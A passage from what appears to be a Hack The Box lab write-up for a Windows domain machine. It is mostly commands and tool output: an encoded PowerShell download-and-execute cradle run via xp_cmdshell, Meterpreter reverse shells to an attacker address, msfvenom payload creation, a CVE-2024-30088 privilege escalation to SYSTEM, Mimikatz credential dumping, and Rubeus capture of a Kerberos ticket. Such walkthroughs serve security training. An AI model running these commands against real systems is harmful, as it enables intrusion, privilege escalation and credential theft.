AgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAMAA4ADAALwAyAHoAaABzAHMAOAAnACkAKQA7AA==
```

Then back to sql to execute it.

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABtAGIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbQBiAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbQBiAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAMAAvADIAegBoAHMAcwA4AC8AWgBIADAAUAA0AFoAeABFAFgAZgB5AFUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAMAA4ADAALwAyAHoAaABzAHMAOAAnACkAKQA7AA=="
```

```bash
[*] 10.129.121.112   web_delivery - Delivering AMSI Bypass (1392 bytes)
[*] 10.129.121.112   web_delivery - Delivering Payload (3696 bytes)
[*] Sending stage (203846 bytes) to 10.129.121.112
[*] Meterpreter session 1 opened (10.10.16.30:4444 -> 10.129.121.112:54033) at 2025-10-06 06:44:29 -0400
```

We can see the session 1 has been opened, we can now interact with this one.

```bash
msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: darkzero-ext\svc_sql
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  5
============
Name         : Microsoft Hyper-V Network Adapter
Hardware MAC : 00:15:5d:f2:5c:01
MTU          : 1500
IPv4 Address : 172.16.20.2
IPv4 Netmask : 255.255.255.0
```

From here we doing some recon to use if there is some local exploit we can use to escalated in this session.

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.16.30:4444 -> 10.129.121.112:54033 (172.16.20.2)

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run
```

```bash
msf post(multi/recon/local_exploit_suggester) > run
[*] 172.16.20.2 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 172.16.20.2 - 206 exploit checks are being tried...
[+] 172.16.20.2 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[+] 172.16.20.2 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 49 / 49
[*] 172.16.20.2 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 - ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 11  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 12  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_comhijack                      No                       The target is not exploitable.
 14  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 17  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 18  exploit/windows/local/capcom_sys_exec                          No                       Cannot reliably check exploitability.
 19  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.
 20  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. Target is not running a vulnerable version of Windows!
 21  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
 22  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 23  exploit/windows/local/cve_2020_1054_drawiconex_lpe             No                       The target is not exploitable. No target for win32k.sys version 10.0.20348.2110
 24  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
 25  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_17136                           No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 27  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
 28  exploit/windows/local/cve_2021_40449                           No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 29  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
 30  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2
 31  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 32  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 33  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 34  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2022 (10.0 Build 20348). is not vulnerable
 35  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.
 36  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 37  exploit/windows/local/ms15_078_atmfd_bof                       No                       Cannot reliably check exploitability.
 38  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
 39  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 40  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 41  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 42  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
 43  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 44  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 45  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
 46  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 47  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
 48  exploit/windows/local/webexec                                  No                       The check raised an exception.
 49  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.

[*] Post module execution completed
```

So we found 9/49 is potientially vulnerable, but the `cve_2024_30088_authz_basep` is really solid cause it got version detected and also revision number detected also. <br>
&rarr; We gonna use this [cve-2024-30088](https://nvd.nist.gov/vuln/detail/cve-2024-30088) to exploit.

### cve-2024-30088
```bash
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > show options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.147.141   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.16.30
LHOST => 10.10.16.30
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/cve_2024_30088_authz_basep) > set EXITFUNC none
EXITFUNC => none
msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.16.30:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 3988...
[*] 172.16.20.2 - Meterpreter session 1 closed.  Reason: Died
[-] Exploit failed [user-interrupt]: Rex::TimeoutError Send timed out
[-] run: Interrupted
```

After running it, it going really well but it got died so fast that we can not enable to interact with it as system. <br>
&rarr; Thinking about create another shell and upload to our session 1 and execute to reverse shell on the other terminal that the all session will not be deleted.

So first we gonna create `test.exe` file via `msfvenom`.

```bash
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.30 LPORT=5555 -f exe -o test.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: test.exe
```

Then we upload to `%temp%` folder.

```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > cd %temp%
meterpreter > pwd
C:\Users\svc_sql\AppData\Local\Temp
meterpreter > upload test.exe
[*] Uploading  : /home/kali/HTB_Labs/GACHA_Season9/DarkZero/test.exe -> test.exe
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/kali/HTB_Labs/GACHA_Season9/DarkZero/test.exe -> test.exe
[*] Completed  : /home/kali/HTB_Labs/GACHA_Season9/DarkZero/test.exe -> test.exe
```

Now on the other new terminal, we gonna use module `exploit/multi/handler` and then executed the `test.exe` file.

```bash
└─$ sudo msfconsole -q                                                                                           
[sudo] password for kali: 
[*] Starting persistent handler(s)...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.30
LHOST => 10.10.16.30
msf exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.30      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.30:5555 
msf exploit(multi/handler) > [*] Sending stage (203846 bytes) to 10.129.121.112
[*] Meterpreter session 1 opened (10.10.16.30:5555 -> 10.129.121.112:54034) at 2025-10-06 07:29:29 -0400
sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: darkzero-ext\svc_sql
```

From what we see, we got our new session 1 but the old session from our previous does not deleted. <br>
&rarr; Now we will run the cve and update the options.

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.147.141   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2024_30088_authz_basep) > set session 1
session => 1
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.16.30
LHOST => 10.10.16.30
msf exploit(windows/local/cve_2024_30088_authz_basep) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.16.30:5555 -> 10.129.121.112:54034 (172.16.20.2)

msf exploit(windows/local/cve_2024_30088_authz_basep) > jobs -l

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://10.10.16.30:5555

msf exploit(windows/local/cve_2024_30088_authz_basep) > set EXITFUNC none
EXITFUNC => none
msf exploit(windows/local/cve_2024_30088_authz_basep) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[-] Handler failed to bind to 10.10.16.30:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 3868...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 828
[+] Successfully retrieved winlogon pid: 608
[*] Exploit completed, but no session was created.
```

So far so good but there is no session but remember we does have the old one still opened.

```bash
[*] Sending stage (203846 bytes) to 10.129.121.112
[*] Meterpreter session 4 opened (10.10.16.30:4444 -> 10.129.121.112:54054) at 2025-10-06 07:33:47 -0400
```

There we go, got connected with new session.

```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  3         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.16.30:4444 -> 10.129.121.112:54084 (172.16.20.2)
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DC02   10.10.16.30:4444 -> 10.129.121.112:54054 (172.16.20.2)

msf exploit(windows/local/cve_2024_30088_authz_basep) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now we are in `NT AUTHORITY\SYSTEM`.

```bash
meterpreter > shell
Process 4000 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>type c:\Users\Administrator\Desktop\user.txt
type c:\Users\Administrator\Desktop\user.txt
8b7e88dd8aa82864debcaa8464f39433
```

Take away the `user.txt` flag.

> *First sight I thought it would be root flag of the entire machine cause it was in `Administrator` but nope, DC02 just gave user flag. HAHAHAHA :D*

## Initial Access
So after we gain in the highest level in `DC02`, we can do anything like dumping all creds.

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain        NTLM                              SHA1                                      DPAPI
--------       ------        ----                              ----                                      -----
Administrator  darkzero-ext  6963aad8ba1150192f3ca6341355eb49  93564754ec637caa92a4a9b7e8fc080a7f9fe8bb  07f02ffc631a34deccda1490a397d2b4
DC02$          darkzero-ext  663a13eb19800202721db4225eadc38e  be3d502f8be10e1c8731103e904fd3f34b89eaeb  be3d502f8be10e1c8731103e904fd3f3
svc_sql        darkzero-ext  816ccb849956b531db139346751db65f  55c16d33c59d421bb40ca1f18b5ed46e8dfc403a  cda84acbc3e884f322d47ab3922a9450

wdigest credentials
===================

Username       Domain        Password
--------       ------        --------
(null)         (null)        (null)
Administrator  darkzero-ext  (null)
DC02$          darkzero-ext  (null)
svc_sql        darkzero-ext  (null)

kerberos credentials
====================

Username       Domain        Password
--------       ------        --------
(null)         (null)        (null)
Administrator  DARKZERO.EXT  (null)
DC02$          darkzero.ext  a8 e1 9b 6a 34 5f 5f d4 10 5c 5e 66 c3 53 ed dd 7b 57 01 1d ab b7 ae d7 11 ca 85 49 fc 3b 51 2b 12 9a e6 65 19 ff 51 43 b9 ea 9e 50 72 39 4d 69 11 5a 9d 06 36 79 41 31 17 e4 da d2 38 76 cd 52 aa 46 2a 08 bb 41 38 23 8e 3b dc 01 e2 73 83 1c 14 b3 f2 20 27 03 3e fd c7 34 29 5b af 30 76
                             11 e5 a1 9f 55 d5 eb 58 08 c1 a6 90 a0 28 b1 9d be 0c a6 ef 4d 75 fe 86 4f 91 03 81 50 05 fc e4 1b d7 54 60 1e 55 25 da 29 b9 20 01 ec 17 5c 8c c5 31 88 ef bf 68 06 11 4b b2 7a b2 f2 8e 67 37 ed 82 ab d5 e1 c8 83 f0 2b 65 d6 2c 34 c2 65 9c 8f e8 d8 19 0b 48 23 1d b9 a5 4e 2f 94 41 45
                             eb f9 e7 0a 26 0d a9 3c 64 05 2c ce fe 55 ff 63 9f 26 eb e2 47 0e 46 25 8e 46 b6 dd df 69 d3 bd fa 8f 9d 38 7c 95 1a 8c c6 ab 3e 72 58 39 b7 30 53 8f
dc02$          DARKZERO.EXT  (null)
svc_sql        DARKZERO.EXT  (null)
```

But the goal is to also pwned the `DC01` as well. <br>
As we know `DC01` got unconstrained delegation vulenrable via [powerview.py](https://github.com/aniqfakhrul/powerview.py). <br>
&rarr; Let's double-check with `DC02` also.

### Unconstrained Delegation
```bash
PS C:\Windows\system32> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-List Name,TrustedForDelegation,servicePrincipalName,Description
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-List Name,TrustedForDelegation,servicePrincipalName,Description


Name                 : DC02
TrustedForDelegation : True
servicePrincipalName : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC02.darkzero.ext, 
                       ldap/DC02.darkzero.ext/ForestDnsZones.darkzero.ext, 
                       ldap/DC02.darkzero.ext/DomainDnsZones.darkzero.ext, TERMSRV/DC02...}
Description          :
```

Okay, so we got `TrustedForDelegation` is `True`. <br>
&rarr; From here we can do anything to authenticate to `DC02` from `DC01`, so that the TGT will be cached in `DC02` and cause of that we are `SYSTEM`, we can extract them out.

We gonna do this with [Rubeus](https://github.com/GhostPack/Rubeus).

```bash
meterpreter > upload /usr/share/windows-resources/rubeus/Rubeus.exe
[*] Uploading  : /usr/share/windows-resources/rubeus/Rubeus.exe -> Rubeus.exe
[*] Uploaded 271.50 KiB of 271.50 KiB (100.0%): /usr/share/windows-resources/rubeus/Rubeus.exe -> Rubeus.exe
[*] Completed  : /usr/share/windows-resources/rubeus/Rubeus.exe -> Rubeus.exe
meterpreter > shell
Process 3908 created.
Channel 4 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\TEMP>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E415-87AD

 Directory of C:\Windows\TEMP

10/06/2025  05:15 AM    <DIR>          .
07/30/2025  03:57 PM    <DIR>          ..
07/29/2025  09:59 AM            12,500 MpCmdRun.log
07/29/2025  12:32 PM            88,836 MpSigStub.log
10/06/2025  05:16 AM           278,016 Rubeus.exe
10/05/2025  03:19 PM               102 silconfig.log
07/30/2025  10:09 AM           196,608 TS_F749.tmp
07/30/2025  10:09 AM           196,608 TS_F7A8.tmp
               6 File(s)        772,670 bytes
               2 Dir(s)   3,302,645,760 bytes free
```

We can get this `Rubeus.exe` from [releases](https://github.com/GhostPack/Rubeus/releases) site or if we already download it on our machine, we can use `locate` and get the path with `.exe`.

```bash
└─$ locate rubeus
/opt/chainsaw/sigma/rules/windows/builtin/security/win_security_register_new_logon_process_by_rubeus.yml
/opt/chainsaw/sigma/rules/windows/powershell/powershell_script/posh_ps_hktl_rubeus.yml
/opt/chainsaw/sigma/rules/windows/process_creation/proc_creation_win_hktl_rubeus.yml
/usr/bin/rubeus
/usr/share/applications/kali-rubeus.desktop
/usr/share/chainsaw/rules/mft/rubeus_mft.yml
/usr/share/doc/rubeus
/usr/share/doc/rubeus/changelog.Debian.gz
/usr/share/doc/rubeus/changelog.gz
/usr/share/doc/rubeus/copyright
/usr/share/icons/hicolor/16x16/apps/kali-rubeus.png
/usr/share/icons/hicolor/22x22/apps/kali-rubeus.png
/usr/share/icons/hicolor/24x24/apps/kali-rubeus.png
/usr/share/icons/hicolor/256x256/apps/kali-rubeus.png
/usr/share/icons/hicolor/32x32/apps/kali-rubeus.png
/usr/share/icons/hicolor/48x48/apps/kali-rubeus.png
/usr/share/icons/hicolor/scalable/apps/kali-rubeus.svg
/usr/share/kali-menu/applications/kali-rubeus.desktop
/usr/share/windows-resources/rubeus
/usr/share/windows-resources/rubeus/Rubeus.exe
/var/cache/apt/archives/rubeus_1.6.4-0kali1_all.deb
/var/lib/dpkg/info/rubeus.list
/var/lib/dpkg/info/rubeus.md5sums
```

## Privilege Escalation
Now using Rubeus to monitor TGTs

### Rubeus
```bash
C:\Windows\TEMP>.\Rubeus.exe monitor /interval:5 /nowrap
.\Rubeus.exe monitor /interval:5 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 12:49:27 AM
  EndTime               :  10/6/2025 10:49:27 AM
  RenewTill             :  10/12/2025 3:18:44 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD62ZuGmJG0/HYTkHEpCAtXZ7AxWp4ay+2Nx/qFjh62y4L0nfcAj9jc2SQivrKeU0fmU7H1R6PmvMFg9nZxsCqytruLus3vhT3rw+ed1i57+b7jGml5jMy3xxPgmAKhnjz5k9nydNR6FrJrJjtZUdBG7/v5KG7QC+5/yccNXXAK01jmIsDxHfYNSu0n/1GBRjyYU3m/9VeUho4+z3Zuk3WSr1vhwxL7vhxcBFLVqffr+P+ht34YtVcqdhIvFc7KmKRp8EkLCnEsKG8x2mXpVOyvcMQpn4ncIA3QRIxGZQofyuvpaSMgUZCARtQ1GW/hIp0tjuFAWr4750pneGI7AWUvpZV5/wsUEtSbTapKFLKmTb4L9JY9gQ+DoeKKkWBPCK8GwXzCYsFaIpZwzIlgyvQJ1ei16g9I9KXArujj91ircgGOuoZwam21FuBx9epIk11QIXAdptqrbluYPqCcZxmOPFIwKx7rFBgI3+RzUsZwuMNYl9hhf6wXtU/d8jGbqpxVM2JIoCIT0Qvla8sSrmICW2dxVX59H3m0RRZBSsRsHDDsOebOBYZY16VObdJi6tGXAOu77kYNZ0Rhw43orW57Xm/ebJqQjex8eAarO1vEJazBJWyIVK0an51SvwCl2BpbTKBca/OeMnEluJWCVcGQBMNgExvOi8Tb9RDv94DBTAMJ7AY9TKXT0xH3WD1LQw/iAYmS/nXV46cEKqyKyR2noQOw+Ios1nh0w4dFBeCowUNW2XKPvvEMYMmivKw/ShJqGPZmhamEtXBNz3o7nKX73z/3pRVDSjUyZaGWPZ04TBga9vba7pvovSqZ/ylQ2sMapvYVxrYuFNUJ0X9WjwybPWE7hgm3N8EN0WlmCfRXnBKFu70yGY+2VTLTQvloL3lxSjOsLzGRVk0qkIcoqE3jQeYYYmuEH42M+nfB7eyDMK+ZJiGBGVuY4x0OrISmpLohHv1Ll9vrrhatyXFy5wWlofWY3VViqRHYWtkPLiZASoD28LJYDeSGs1+i+qr3oY7aHBTfRLAWY1PoUBNPUON/BY00Hv27OpQQjfQukhIWXpfajlqtUwKZ525JStX5I+oah8/0qhyUJ5UHHwWP6LGPuIvaSQRQiP4SJr0xBWCRJwXw3b6qT26p88fGGlJx3zsf4UXZVOkGNedQZtVD5/zWibp5J7De3voyKg7fVfGyhNH9moghdzzjKRoNl4rpaJGX6WYQtrbFRs1C4YwFatdWgqe7e1nBEqwB8Tl40LuJVoztFbRiVVQt/Z7J/HFjwxiWbJP7ll7d7LVzwsqjvPjQRtJTv/kE7xCj6rw1fqv7ovxnBe5sMJjKZNazku7b03GfpjLk77oilvOIUzYDQBbtV3Ks6HhGDdQbENabq8qyp1uiGSwbqAU3I1mG/oeSVW1xEvMxsz/z8k0LGq2mkqp56Q03cD+6X+ouV+YRoHg+jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDAt3mwv/h9wKa5ShBM3jRlpbFPfXeUYlARGv9r9XdM+KEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAYKEAAKURGA8yMDI1MTAwNjA3NDkyN1qmERgPMjAyNTEwMDYxNzQ5MjdapxEYDzIwMj